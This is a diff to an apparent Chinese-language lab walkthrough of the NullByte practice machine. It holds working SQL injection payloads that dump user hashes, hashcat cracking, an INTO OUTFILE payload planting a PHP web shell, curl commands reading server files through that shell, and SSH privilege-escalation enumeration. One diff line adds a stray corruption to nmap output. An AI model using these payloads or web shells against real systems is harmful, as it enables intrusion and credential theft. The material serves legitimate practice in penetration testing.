@@ -23,7 +23,7 @@ Nmap scan report for 192.168.2.147
 Host is up (0.00092s latency).
 MAC Address: 00:0C:29:5D:65:77 (VMware)
 Nmap scan report for 192.168.2.254
-Host is up (0.00019s latency).
+Host is up (0.00019s lßßatency).
 MAC Address: 00:50:56:E6:75:62 (VMware)
 Nmap scan report for 192.168.2.128
 Host is up.
@@ -121,7 +121,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds
 ❯ sudo nmap --script=vuln -p80,111,777,5353,40979,48107 192.168.2.147 -oA Nmap-scan/Script
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 21:21 HKT
 Pre-scan script results:
-| broadcast-avahi-dos: 
+| broadcast-avahi-dos:   
 |   Discovered hosts:
 |     224.0.0.251
 |   After NULL UDP avahi packet DoS (CVE-2011-1002).
@@ -266,14 +266,250 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-09 09:50:
 ### sql注入
 
 -   输入双引号会触发sql语句报错
+
 -   ![image-20230609100151364](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100151364.png)
+
 -   构建sql语句，查看当前有几列数据`" order by 4 -- `查询到第四列数据时进行报错
+
 -   ![image-20230609100412683](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100412683.png)
+
 -   查看回显点`" union select 1,2,3 -- `
+
 -   ![image-20230609100519574](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100519574.png)
+
 -   查看当前的库信息，版本信息，用户信息`" union select version(),database(),user() -- `
+
 -   ![image-20230609100723443](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100723443.png)
+
+-   列出当前所有表的信息，通过读取`information_schema`表 ` " union select table_schema,table_name,3 from information_schema.tables; -- - `
+
+-   ![image-20230726104342105](https://raw.githubusercontent.com/r0o983/images/main/image-20230726104342105.png)
+
+-   查找当前数据库的表`seth`,读取具体信息`" union select table_name,2,3 from information_schema.tables='seth'; -- - `
+
+-   ![image-20230728185132250](https://raw.githubusercontent.com/r0o983/images/main/image-20230728185132250.png)
+
+-   查询当前`users`表的字段，`" union select column_name,2,3 from information_schema.columns where table_schema='seth' and  table_name='users'; -- -`
+
+-   ![image-20230728185342962](https://raw.githubusercontent.com/r0o983/images/main/image-20230728185342962.png)
+
+-   根据回显位置直接查出`id,user,pass`信息`" union select id,user,pass from users -- - `
+
+-   ![image-20230728185518364](https://raw.githubusercontent.com/r0o983/images/main/image-20230728185518364.png)
+
+-   获得ramses用户的密码：`YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE`
+
+-   使用kali自带的解码工具或者直接浏览器搜索解密即可得到以下字符串
+
+-   ```shell
+    ❯ echo -n "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" | base64  -d
+    c6d6bd7ebf806f43c76acc3681703b81
+    ```
+
+-   使用md5将字符串进行解密，使用hashcat或者john都可以进行破解，语法类似效果相同。
+
+-   ```shell
+    hashcat -m 0 -a 0 crash /usr/share/wordlists/rockyou.txt     
+    hashcat (v6.2.6) starting
+    
+    OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+    ==================================================================================================================================================
+    * Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz, 2910/5884 MB (1024 MB allocatable), 4MCU
+    
+    Minimum password length supported by kernel: 0
+    Maximum password length supported by kernel: 256
+    
+    Hashes: 1 digests; 1 unique digests, 1 unique salts
+    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+    Rules: 1
+    
+    Optimizers applied:
+    * Zero-Byte
+    * Early-Skip
+    * Not-Salted
+    * Not-Iterated
+    * Single-Hash
+    * Single-Salt
+    * Raw-Hash
+    
+    ATTENTION! Pure (unoptimized) backend kernels selected.
+    Pure kernels can crack longer passwords, but drastically reduce performance.
+    If you want to switch to optimized kernels, append -O to your commandline.
+    See the above message to find out about the exact limits.
+    
+    Watchdog: Temperature abort trigger set to 90c
+    
+    Host memory required for this attack: 1 MB
+    
+    Dictionary cache hit:
+    * Filename..: /usr/share/wordlists/rockyou.txt
+    * Passwords.: 14344385
+    * Bytes.....: 139921507
+    * Keyspace..: 14344385
+    
+    c6d6bd7ebf806f43c76acc3681703b81:omega                    
+                                                             
+    ```
+
+-   得到用户名以及密码：ramses，密码：omega
+
+### sql注入2
+
+-   使用sql注入直接写入一个`php`的小马到之前探测到的`/uploads`文件夹下。
+
+-   >   " union select "<?php system($_GET['cmd']); ?>","","" into outfile "/var/www/html/uploads/shell.php" -- - 
+
+-   尝试访问
+
+-   ![image-20230729124025790](https://raw.githubusercontent.com/r0o983/images/main/image-20230729124025790.png)
+
+-   读取当前数据库的配置文件,当前sql查询页面`kzMb5nVYJw/420search.php`
+
+-   ```shell
+    ❯ curl http://192.168.2.147/uploads/shell1.php\?cmd\=cat%20/var/www/html/kzMb5nVYJw/420search.php 
+    1       ramses
+    2       isis    employee
+    <?php
+    $word = $_GET["usrtosearch"];
+    
+    $dbhost = 'localhost:3036';
+    $dbuser = 'root';
+    $dbpass = 'sunnyvale';
+    $conn = mysql_connect($dbhost, $dbuser, $dbpass);
+    if(! $conn )
+    {
+      die('Could not connect: ' . mysql_error());
+    }
+    $sql = 'SELECT id, user, position FROM users WHERE user LIKE "%'.$word.'%" ';
+    
+    mysql_select_db('seth');
+    $retval = mysql_query( $sql, $conn );
+    if(! $retval )
+    {
+      die('Could not get data: ' . mysql_error());
+    }
+    while($row = mysql_fetch_array($retval, MYSQL_ASSOC))
+    {
+        echo "EMP ID :{$row['id']}  <br> ".
+             "EMP NAME : {$row['user']} <br> ".
+             "EMP POSITION : {$row['position']} <br> ".
+             "--------------------------------<br>";
+    } 
+    echo "Fetched data successfully\n";
+    mysql_close($conn);
+    
+    ?>
+    
+    ```
+
+-   成功登陆`phpmyadmin`页面
+
+-   ![image-20230729131622659](https://raw.githubusercontent.com/r0o983/images/main/image-20230729131622659.png)
+
+### sql注入3
+
+通过sql注入直接写入大马，写入到`/uploads/`文件夹下。
+
+## 获取初始权限
+
+-   使用刚才获取的用户名以及密码尝试进行ssh登陆
+
+-   ```shell
+    root@567701cfe966:/var/www/html/sql-connections# ssh ramses@192.168.2.147 -p 777
+    ramses@192.168.2.147's password: 
+    
+    The programs included with the Debian GNU/Linux system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+    
+    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+    permitted by applicable law.
+    Last login: Wed Jul 12 21:49:51 2023 from 192.168.2.128
+    ramses@NullByte:~$ uname -a
+    Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
+    ramses@NullByte:~$  ip a
+    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+        inet 127.0.0.1/8 scope host lo
+           valid_lft forever preferred_lft forever
+        inet6 ::1/128 scope host 
+           valid_lft forever preferred_lft forever
+    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+        link/ether 00:0c:29:5d:65:77 brd ff:ff:ff:ff:ff:ff
+        inet 192.168.2.147/24 brd 192.168.2.255 scope global eth0
+           valid_lft forever preferred_lft forever
+        inet6 fe80::20c:29ff:fe5d:6577/64 scope link 
+           valid_lft forever preferred_lft forever
+    ramses@NullByte:~$ whoami
+    ramses
+    
+    ```
+
+### 提权
+
+-   尝试使用`sudo -l ` 发现当前用户无法使用sudo
+
+-   ```shell
+    ramses@NullByte:~$ sudo -l
+    [sudo] password for ramses: 
+    Sorry, user ramses may not run sudo on NullByte.
+    ```
+
+-   无定时任务
+
+-   ```shell
+    ramses@NullByte:~$ cat /etc/crontab 
+    # /etc/crontab: system-wide crontab
+    # Unlike any other crontab you don't have to run the `crontab'
+    # command to install the new version when you edit this file
+    # and files in /etc/cron.d. These files also have username fields,
+    # that none of the other crontabs do.
+    
+    SHELL=/bin/sh
+    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+    
+    # m h dom mon dow user  command
+    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+    #
+    ramses@NullByte:~$ 
+    
+    ```
+
+-   在`home`目录下，发现一个`.bash_history`文件，查看其内容发现敏感目录
+
+-   ```shell
+    ramses@NullByte:~$ ls -lhai
+    total 24K
+    477 drwxr-xr-x 2 ramses ramses 4.0K Aug  2  2015 .
+     22 drwxr-xr-x 5 root   root   4.0K Aug  2  2015 ..
+    609 -rw------- 1 ramses ramses  134 Jul  3 23:15 .bash_history
+    480 -rw-r--r-- 1 ramses ramses  220 Aug  2  2015 .bash_logout
+    482 -rw-r--r-- 1 ramses ramses 3.5K Aug  2  2015 .bashrc
+    481 -rw-r--r-- 1 ramses ramses  675 Aug  2  2015 .profile
+    ramses@NullByte:~$ cat .bash_history 
+    sudo -s
+    su eric
+    exit
+    ls
+    clear
+    cd /var/www
+    cd backup/
+    ls
+    ./procwatch 
+    clear
+    sudo -s
+    cd /
+    ls
+    exit
+    ipa
+    ip a
+    whoami
+    uname -a
+    sudo -l
+    exit
+    ```
+
 -   
-
-
-
